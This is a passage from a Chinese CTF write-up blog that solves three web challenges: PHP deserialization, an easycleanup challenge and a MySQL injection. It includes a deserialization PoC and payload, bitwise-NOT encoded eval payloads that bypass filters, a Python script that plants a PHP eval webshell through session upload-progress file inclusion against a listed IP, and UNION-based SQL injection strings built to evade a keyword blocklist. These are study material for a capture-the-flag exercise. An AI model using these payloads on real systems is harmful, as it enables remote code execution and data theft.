class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cinder-&gt;<span class="title function_ invoke__">echo_name</span>();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack = <span class="title function_ invoke__">unserialize</span>(<span class="variable language_">$this</span>-&gt;docker);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="variable language_">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(file__); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>造个poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cinder-&gt;<span class="title function_ invoke__">echo_name</span>();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack = <span class="title function_ invoke__">unserialize</span>(<span class="variable language_">$this</span>-&gt;docker);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> acp;</span><br><span class="line"><span class="variable">$a</span>-&gt;cinder = <span class="keyword">new</span> ace;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;cinder-&gt;filename = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;cinder-&gt;docker = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- O%3A3%3A&quot;acp&quot;%3A3%3A%7Bs%3A6%3A&quot;cinder&quot;%3BO%3A3%3A&quot;ace&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A9%3A&quot;openstack&quot;%3BN%3Bs%3A6%3A&quot;docker&quot;%3Bs%3A133%3A&quot;O%3A3%3A&quot;acp&quot;%3A3%3A%7Bs%3A6%3A&quot;cinder&quot;%3BO%3A3%3A&quot;ace&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A9%3A&quot;openstack&quot;%3BN%3Bs%3A6%3A&quot;docker&quot;%3BN%3B%7Ds%3A7%3A&quot;neutron&quot;%3BN%3Bs%3A4%3A&quot;nova&quot;%3BN%3B%7D&quot;%3B%7Ds%3A7%3A&quot;neutron&quot;%3BN%3Bs%3A4%3A&quot;nova&quot;%3BN%3B%7D --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--?php</span></span><br><span class="line"><span class="comment">//flag&#123;fXM75u5IqcaEwdIibN4DOpHGGnyi&#125;;</span></span><br><span class="line"><span class="comment">$heat=&#x27;asdwe1g648798qwe321d65&#x27;;</span></span><br><span class="line"><span class="comment">?--&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="easycleanup"><a href="#easycleanup" class="headerlink" title="easycleanup"></a>easycleanup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] ?? <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ban掉大小写以及数字，还ban了反引号，<code>$_</code>，问号，异或符号，星号，加减号。<br>通过取反绕过，进行命令执行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">(~%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br><span class="line">啥也没有</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">93</span>%<span class="number">8</span>c);</span><br><span class="line">刚好<span class="number">15</span>字符，只有index.php</span><br><span class="line"></span><br><span class="line">构造exec，完了发现只有四个字符的位置了，也就是说只能进行<span class="number">4</span>字rce了：</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;&gt;ls&quot;</span>)</span><br><span class="line">(~%<span class="number">9</span>a%<span class="number">87</span>%<span class="number">9</span>a%<span class="number">9</span>c)(~%c1%<span class="number">93</span>%<span class="number">8</span>c);</span><br><span class="line">写完再执行ls，没有增加文件，看来是没有权限，没招了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>赛后：session文件包含，我傻了，不听前辈言，吃亏在眼前</p>
<p>题目：easycleanup<br>内容：到死都不会清理</p>
<p>通过异或绕过进行rce，得到phpinfo页面之后，查看：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">Off</span></span><br><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span></span><br></pre></td></tr></table></figure>
<p>第一个设置为<code>Off</code>表示上传的session文件不会被清理，同时第二个设置<code>On</code>表示能够设置：<br>网上扒了个session上传的脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line">url = <span class="string">&quot;http://114.115.134.72:32770/&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;hua&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    filebytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">    data = &#123;</span><br><span class="line">       <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php echo &#x27;muhua!&#x27;;@eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">       &#125;</span><br><span class="line">    </span><br><span class="line">    cookies = &#123;</span><br><span class="line">           <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">           &#125;</span><br><span class="line">    </span><br><span class="line">    files = &#123;</span><br><span class="line">               <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;muhua.jpg&#x27;</span>, filebytes)</span><br><span class="line">               &#125;</span><br><span class="line">    res = session.post(url,data=data,cookies=cookies,files=files)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">       write(session)</span><br></pre></td></tr></table></figure>
<p>因为不会清理，所以不需要一直发，改了改，传上去，注意文件名<code>/tmp/sess_name</code>不要超过15字符，这里就直接上传</p>
<p>然后利用file参数进行包含，直接蚁剑连接，找到根目录下的<code>flag_is_here_not_are_but_you_find</code></p>
<h2 id="yet-another-mysql-injection"><a href="#yet-another-mysql-injection" class="headerlink" title="yet_another_mysql_injection"></a>yet_another_mysql_injection</h2><p>打开页面源码：<code>/?source</code></p>
<p>直接给出了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- source code here:  /?source --&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>有过滤，但直接把sql原句给了，等于是给出了表名，列名，甚至还给了一个索引条件<br>~~<br>将等号使用<code>like</code>代替，尝试本地注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> liu_ling <span class="keyword">from</span> liu_tbl <span class="keyword">where</span> liu_name<span class="operator">=</span><span class="string">&#x27;muhua&#x27;</span> <span class="keyword">and</span> liu_ling<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> liu_ling <span class="keyword">from</span> liu_tbl <span class="keyword">where</span> liu_name <span class="keyword">like</span> <span class="string">&#x27;muhua&#x27;</span>)<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://xiquanmuhua.github.io/images//wp/fivesql1.png" alt="result"></p>
<p>确实是可以查到的<br>但<code>hacker</code>了，因为admin里面含了过滤字符串<code>in</code>，因此进行模糊匹配</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union/**/select/**/(select/**/password/**/from/**/users/**/where/**/username/**/like/**/&#x27;</span>admi<span class="operator">%</span><span class="string">&#x27;)&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>但这次<code>wrong password</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说查到了东西，有可能是有一个<code>adminn</code>之类的干扰：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union/**/select/**/(select/**/password/**/from/**/users/**/where/**/username/**/like/**/&#x27;</span>admi<span class="operator">%</span>n<span class="string">&#x27;)&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>初步猜测是有很多类似的用户名导致模糊匹配了多个，试试有没有<code>id</code>这个字段直接爆：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union/**/select/**/(select/**/password/**/from/**/users/**/where/**/id/**/like/**/&#x27;</span><span class="number">84</span><span class="string">&#x27;/**/)&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>但使用bp和脚本都不行，网页不响应，一堆错误中出个84超时，害我以为出了。。~~</p>
<p>坏了，看错了条件是<code>$row[&#39;password&#39;] === $password</code><br>也就是说，查到的值要和输入的值完全相等（<code>===</code>）</p>
<p>文件写入</p>
<p>想进行文件写入，但<code>&lt;</code>和<code>&gt;</code>都过滤了，<code>in</code>也被过滤了，静态估计也写不了，盲注也没得办法，只能尝试模糊匹配对password字段进行爆破:</p>
